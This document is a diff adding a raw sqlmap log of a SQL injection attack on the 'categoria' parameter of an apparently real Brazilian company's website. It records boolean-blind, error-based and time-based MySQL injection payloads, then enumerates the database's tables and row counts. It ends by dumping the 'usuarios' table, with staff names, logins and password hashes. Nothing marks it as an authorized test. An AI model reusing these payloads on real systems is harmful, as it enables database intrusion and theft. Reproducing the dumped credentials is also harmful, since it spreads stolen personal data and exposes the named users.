@@ -1,0 +1,139 @@
+sqlmap identified the following injection point(s) with a total of 304 HTTP(s) requests:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: op=produtos&categoria=1 AND 2297=2297
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: op=produtos&categoria=1 AND (SELECT 2895 FROM(SELECT COUNT(*),CONCAT(0x7170626b71,(SELECT (ELT(2895=2895,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: op=produtos&categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] esqbaian_ebaiana
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: op=produtos&categoria=1 AND 2297=2297
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: op=produtos&categoria=1 AND (SELECT 2895 FROM(SELECT COUNT(*),CONCAT(0x7170626b71,(SELECT (ELT(2895=2895,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: op=produtos&categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: esqbaian_ebaiana
+[29 tables]
++----------------------------+
+| access                     |
+| acessorios                 |
+| acessos                    |
+| arquivos                   |
+| banners                    |
+| blacklist                  |
+| blacklistTentativas        |
+| config                     |
+| diretivas                  |
+| diretivasAcessos           |
+| diretivasAcessosPermissoes |
+| filiais                    |
+| galeria                    |
+| galeriaCategorias          |
+| galeriaImagens             |
+| grupos                     |
+| listaDiretivas             |
+| listaDiretivasPermissoes   |
+| noticias                   |
+| permissoes                 |
+| popup                      |
+| produtos                   |
+| produtosCategorias         |
+| produtosFotos              |
+| produtosSubsCategorias     |
+| usuarios                   |
+| usuariosGrupos             |
+| usuariosIps                |
+| whitelist                  |
++----------------------------+
+
+Database: esqbaian_ebaiana
++----------------------------+---------+
+| Table                      | Entries |
++----------------------------+---------+
+| access                     | 294789  |
+| diretivasAcessosPermissoes | 338     |
+| listaDiretivasPermissoes   | 215     |
+| diretivasAcessos           | 84      |
+| acessos                    | 41      |
+| produtosFotos              | 31      |
+| acessorios                 | 28      |
+| produtos                   | 24      |
+| blacklistTentativas        | 23      |
+| diretivas                  | 23      |
+| listaDiretivas             | 20      |
+| galeriaImagens             | 14      |
+| permissoes                 | 4       |
+| galeria                    | 3       |
+| usuarios                   | 3       |
+| usuariosGrupos             | 3       |
+| banners                    | 2       |
+| galeriaCategorias          | 2       |
+| grupos                     | 2       |
+| produtosCategorias         | 2       |
+| produtosSubsCategorias     | 2       |
+| config                     | 1       |
+| filiais                    | 1       |
+| noticias                   | 1       |
++----------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: op=produtos&categoria=1 AND 2297=2297
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: op=produtos&categoria=1 AND (SELECT 2895 FROM(SELECT COUNT(*),CONCAT(0x7170626b71,(SELECT (ELT(2895=2895,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: op=produtos&categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: esqbaian_ebaiana
+Table: usuarios
+[3 entries]
++----------+-----------+------------------+------------------------------------------------------------------+-------+---------+
+| filialId | usuarioId | nome             | senha                                                            | ativo | usuario |
++----------+-----------+------------------+------------------------------------------------------------------+-------+---------+
+| 1        | 62        | Diana            | d19da9d51e5225f4c5b28d463f789ac1120a98da4f4f64219d8a93d3e62081cb | t     | diana   |
+| 1        | 63        | Eduardo          | b16b3a5c36a982799fe6d0854db382cc60a4d34c7d022ae48172e5f7031631e7 | t     | eduardo |
+| 1        | 71        | Rafael - Ebaiana | c444ee6191395f97b99d883cb807f287c3815dfeb9d8ad47136a73e24e7cc620 | t     | rafael  |
++----------+-----------+------------------+------------------------------------------------------------------+-------+---------+
+
